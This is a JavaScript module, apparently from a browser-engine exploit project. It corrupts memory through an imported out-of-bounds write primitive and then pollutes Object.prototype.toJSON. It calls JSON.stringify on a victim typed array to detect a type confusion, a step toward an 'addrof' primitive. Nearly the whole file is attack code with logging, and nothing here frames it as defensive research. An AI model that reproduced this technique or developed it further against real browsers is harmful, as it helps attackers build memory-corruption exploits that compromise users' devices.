// js/script3/testArrayBufferVictimCrash.mjs (v_typedArray_addrof_v11_VerifyGlobalProbeDetailsCapture)

import { logS3, PAUSE_S3 } from './s3_utils.mjs';
import { AdvancedInt64, toHex } from '../utils.mjs'; // AdvancedInt64 não usado aqui, mas mantido por consistência
import {
    triggerOOB_primitive,
    oob_array_buffer_real,
    oob_write_absolute,
    clearOOBEnvironment
} from '../core_exploit.mjs';

export const FNAME_MODULE_TYPEDARRAY_ADDROF_V11_VGPDC = "OriginalHeisenbug_TypedArrayAddrof_v11_VerifyGlobalProbeDetailsCapture";

const VICTIM_BUFFER_SIZE = 256;
const LOCAL_HEISENBUG_CRITICAL_WRITE_OFFSET = 0x7C; // Usaremos apenas este offset para simplificar
const OOB_WRITE_VALUE = 0xFFFFFFFF;

let last_probe_call_details_v11 = null; 
// object_to_leak_A/B não são necessários para este teste de logging
let victim_typed_array_ref_v11 = null;

function toJSON_TA_Probe_VerifyGlobalDetails() {
    let current_call_details = {
        probe_variant: "TA_Probe_Addrof_v11_VerifyGlobalProbeDetailsCapture",
        this_type_in_toJSON: "N/A_before_call",
        error_in_toJSON: null,
        probe_called: true,
        this_was_victim_ref: false, // Simplificado: apenas se this === victim
    };

    try {
        current_call_details.this_type_in_toJSON = Object.prototype.toString.call(this);
        current_call_details.this_was_victim_ref = (this === victim_typed_array_ref_v11);
        
        logS3(`[${current_call_details.probe_variant}] Sonda INVOCADA. 'this' type: ${current_call_details.this_type_in_toJSON}. 'this' === victim_typed_array_ref_v11? ${current_call_details.this_was_victim_ref}`, "leak");

        if (current_call_details.this_type_in_toJSON === '[object Object]') {
            logS3(`[${current_call_details.probe_variant}] TYPE CONFUSION DETECTED for 'this' (now [object Object])!`, "vuln");
        } else if (current_call_details.this_was_victim_ref) {
            logS3(`[${current_call_details.probe_variant}] 'this' is victim_typed_array_ref_v11, type is ${current_call_details.this_type_in_toJSON}.`, "info");
        } else {
            logS3(`[${current_call_details.probe_variant}] 'this' (type: ${current_call_details.this_type_in_toJSON}) is not victim_typed_array_ref_v11.`, "warn");
        }

    } catch (e) {
        current_call_details.error_in_toJSON = `${e.name}: ${e.message}`;
        logS3(`[${current_call_details.probe_variant}] ERROR in probe: ${e.name} - ${e.message}`, "error");
    }
    
    // Atualiza a variável global com os detalhes desta chamada.
    // Esta é a linha crítica para verificar.
    last_probe_call_details_v11 = { ...current_call_details }; 
    logS3(`[${current_call_details.probe_variant}] Probe FINISHING. Global 'last_probe_call_details_v11' updated to: ${JSON.stringify(last_probe_call_details_v11)}`, "dev_verbose");

    return undefined; // Crucial: não retornar o objeto de detalhes.
}

export async function executeTypedArrayVictimAddrofTest_VerifyGlobalProbeDetailsCapture() {
    const FNAME_CURRENT_TEST = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V11_VGPDC}.triggerAndVerify`;
    logS3(`--- Initiating ${FNAME_CURRENT_TEST}: Verifying Global Probe Detail Capture ---`, "test", FNAME_CURRENT_TEST);
    document.title = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V11_VGPDC} Init...`;

    last_probe_call_details_v11 = null; // Reset global
    victim_typed_array_ref_v11 = null; 

    let mainErrorOccurred = null;
    let stringifyOutput = null;
    let captured_probe_details_after_stringify = null;
    let heisenbugConfirmedByCapturedDetails = false;
    
    const fillPattern = 0.11122233344455; // Apenas para o buffer, não usado para addrof aqui

    try {
        await triggerOOB_primitive({ force_reinit: true });
        if (!oob_array_buffer_real && typeof oob_write_absolute !== 'function') {
            throw new Error("OOB Init failed or oob_write_absolute not available.");
        }
        logS3("OOB Environment initialized.", "info", FNAME_CURRENT_TEST);

        logS3(`STEP 1: Writing CRITICAL value ${toHex(OOB_WRITE_VALUE)} to oob_array_buffer_real[${toHex(LOCAL_HEISENBUG_CRITICAL_WRITE_OFFSET)}]...`, "warn", FNAME_CURRENT_TEST);
        oob_write_absolute(LOCAL_HEISENBUG_CRITICAL_WRITE_OFFSET, OOB_WRITE_VALUE, 4);
        logS3(`  Critical OOB write to ${toHex(LOCAL_HEISENBUG_CRITICAL_WRITE_OFFSET)} performed.`, "info", FNAME_CURRENT_TEST);
        
        await PAUSE_S3(100);

        victim_typed_array_ref_v11 = new Uint8Array(new ArrayBuffer(VICTIM_BUFFER_SIZE)); 
        let float64_view_on_underlying_ab = new Float64Array(victim_typed_array_ref_v11.buffer); 
        for(let i = 0; i < float64_view_on_underlying_ab.length; i++) {
            float64_view_on_underlying_ab[i] = fillPattern + i;
        }

        logS3(`STEP 2: victim_typed_array_ref_v11 (Uint8Array) created.`, "test", FNAME_CURRENT_TEST);
        logS3(`   Attempting JSON.stringify on victim_typed_array_ref_v11 with ${toJSON_TA_Probe_VerifyGlobalDetails.name}...`, "test", FNAME_CURRENT_TEST);
        
        const ppKey = 'toJSON';
        let originalToJSONDescriptor = Object.getOwnPropertyDescriptor(Object.prototype, ppKey);
        let pollutionApplied = false;

        try {
            Object.defineProperty(Object.prototype, ppKey, {
                value: toJSON_TA_Probe_VerifyGlobalDetails,
                writable: true, configurable: true, enumerable: false
            });
            pollutionApplied = true;
            logS3(`  Object.prototype.${ppKey} polluted.`, "info", FNAME_CURRENT_TEST);

            logS3(`  Calling JSON.stringify(victim_typed_array_ref_v11)...`, "warn", FNAME_CURRENT_TEST);
            stringifyOutput = JSON.stringify(victim_typed_array_ref_v11); 
            
            logS3(`  JSON.stringify completed. Stringify Output (first 100 chars): ${stringifyOutput ? stringifyOutput.substring(0,100) + (stringifyOutput.length > 100 ? "..." : "") : 'N/A'}`, "info", FNAME_CURRENT_TEST);
            
            // Captura e loga o estado da variável global APÓS stringify
            if (last_probe_call_details_v11) {
                captured_probe_details_after_stringify = { ...last_probe_call_details_v11 }; 
            }
            logS3(`  Captured last_probe_call_details_v11 state AFTER stringify: ${captured_probe_details_after_stringify ? JSON.stringify(captured_probe_details_after_stringify) : 'null (probe likely not called or error)'}`, "leak", FNAME_CURRENT_TEST);

            if (captured_probe_details_after_stringify && 
                captured_probe_details_after_stringify.probe_called &&
                captured_probe_details_after_stringify.this_type_in_toJSON === "[object Object]") {
                heisenbugConfirmedByCapturedDetails = true;
                logS3(`  HEISENBUG ON 'this' OF PROBE CONFIRMED by captured details! 'this' type in last probe: ${captured_probe_details_after_stringify.this_type_in_toJSON}`, "vuln", FNAME_CURRENT_TEST);
            } else {
                let msg = "Heisenbug on 'this' of probe NOT confirmed by captured details.";
                if(captured_probe_details_after_stringify && captured_probe_details_after_stringify.this_type_in_toJSON) {
                    msg += ` 'this' type in last probe: ${captured_probe_details_after_stringify.this_type_in_toJSON}.`;
                } else if (!captured_probe_details_after_stringify) {
                    msg += " Captured last probe details are null.";
                }
                logS3(`  ALERT: ${msg}`, "error", FNAME_CURRENT_TEST);
            }
            document.title = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V11_VGPDC}: ${heisenbugConfirmedByCapturedDetails ? "TC Confirmed" : "TC NOT Confirmed"}`;

        } catch (e_str) {
            mainErrorOccurred = e_str; // Changed from errorCapturedMain to mainErrorOccurred
            logS3(`    CRITICAL ERROR during JSON.stringify or verification: ${e_str.name} - ${e_str.message}${e_str.stack ? '\n'+e_str.stack : ''}`, "critical", FNAME_CURRENT_TEST);
            document.title = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V11_VGPDC}: Stringify/Verify ERR`;
        } finally {
            if (pollutionApplied) {
                if (originalToJSONDescriptor) Object.defineProperty(Object.prototype, ppKey, originalToJSONDescriptor);
                else delete Object.prototype[ppKey];
                logS3(`  Object.prototype.${ppKey} restored.`, "info", FNAME_CURRENT_TEST);
            }
        }

    } catch (e_outer_main) {
        mainErrorOccurred = e_outer_main; // Changed from errorCapturedMain to mainErrorOccurred
        logS3(`OVERALL CRITICAL ERROR in test: ${e_outer_main.name} - ${e_outer_main.message}`, "critical", FNAME_CURRENT_TEST);
        document.title = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V11_VGPDC} CRITICALLY FAILED`;
    } finally {
        clearOOBEnvironment();
        logS3(`--- ${FNAME_CURRENT_TEST} Completed ---`, "test", FNAME_CURRENT_TEST);
        logS3(`Heisenbug confirmation by captured details: ${heisenbugConfirmedByCapturedDetails}`, heisenbugConfirmedByCapturedDetails ? "good" : "warn", FNAME_CURRENT_TEST);
        if (captured_probe_details_after_stringify) {
             logS3(`Final captured probe details: ${JSON.stringify(captured_probe_details_after_stringify)}`, "leak", FNAME_CURRENT_TEST);
        }
        
        victim_typed_array_ref_v11 = null; 
        last_probe_call_details_v11 = null; 
    }
    return { 
        errorOccurred: mainErrorOccurred, 
        potentiallyCrashed: false, 
        stringifyResult: stringifyOutput, 
        toJSON_details: captured_probe_details_after_stringify,
        heisenbug_confirmed_externally: heisenbugConfirmedByCapturedDetails
        // addrof results removed as not relevant for this specific test
    };
}
